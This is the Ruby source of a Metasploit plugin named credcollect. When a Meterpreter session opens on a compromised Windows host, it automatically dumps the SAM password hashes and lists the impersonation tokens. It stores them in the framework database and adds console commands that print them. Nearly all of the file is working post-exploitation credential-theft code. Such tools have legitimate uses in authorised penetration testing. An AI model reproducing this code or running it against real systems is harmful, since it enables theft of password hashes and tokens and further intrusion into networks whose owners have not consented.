# credcollect - tebo[at]attackresearch.com
module Msf

class Plugin::CredCollect < Msf::Plugin
	include Msf::SessionEvent

	class CredCollectCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		def name
			"credcollect"
		end

		def commands
			{
				"db_hashes" => "Dumps hashes collected in the database",
				"db_tokens" => "Dumps tokens collected in the database with host information"
			}
		end

		def cmd_db_hashes()
			if not self.framework.db.active
				print_error("Database not connected")
				return
			end
			framework.db.get_auth_info(:proto=>"smb").each do |info|
				if info.kind_of? Hash and info.has_key? :hash_string
					print_line(info[:hash_string])
				end
			end
		end
		
		def cmd_db_tokens()
			if not self.framework.db.active
				print_error("Database not connected")
				return
			end
			framework.db.get_auth_info(:proto=>"smb").each do |info|
				if info.kind_of? Hash and info.has_key? :token
					print_line(info[:targ_host] + " - " + info[:token])
				end
			end
		end
	end

	def on_session_open(session)
	
		return if not self.framework.db.active
		
		print_status("This is CredCollect, I have the conn!")
		
		if (session.type == "meterpreter")
			
			# Make sure we're rockin Priv and Incognito
			session.core.use("priv")
			session.core.use("incognito")

			# It wasn't me mom! Stinko did it!
			hashes = session.priv.sam_hashes
			
			# Target infos for the db record
			addr = session.sock.peerhost
			host = self.framework.db.find_or_create_host(
				:host => addr, 
				:state => Msf::HostState::Alive
				)

			# Record hashes to the running db instance
			hashes.each do |hash|
				data = {}
				data[:host]      = host
				data[:targ_host] = host.address
				data[:proto]     = 'smb'
				data[:user]      = hash.user_name
				data[:hash]      = hash.lanman + ":" + hash.ntlm
				data[:hash_string] = hash.hash_string

				self.framework.db.report_auth_info(data)
			end

			# Record user tokens
			tokens = session.incognito.incognito_list_tokens(0).values
			# Meh, tokens come to us as a formatted string
			tokens = tokens.join.strip!.split("\n")

			tokens.each do |token|
				data = {}
				data[:host]      = host
				data[:targ_host] = host.address
				data[:proto]     = 'smb'
				data[:token]     = token

				self.framework.db.report_auth_info(data)
			end
		end
	end

	def on_session_close(session)
	end

	def initialize(framework, opts)
		super
		self.framework.events.add_session_subscriber(self)
		add_console_dispatcher(CredCollectCommandDispatcher)
	end

	def cleanup
		self.framework.events.remove_session_subscriber(self)
		remove_console_dispatcher('credcollect')
	end

	def name
		"db_credcollect"
	end

	def desc
		"Automatically grabs hashes and tokens from meterpreter session events and stores them in the db"
	end

end
end
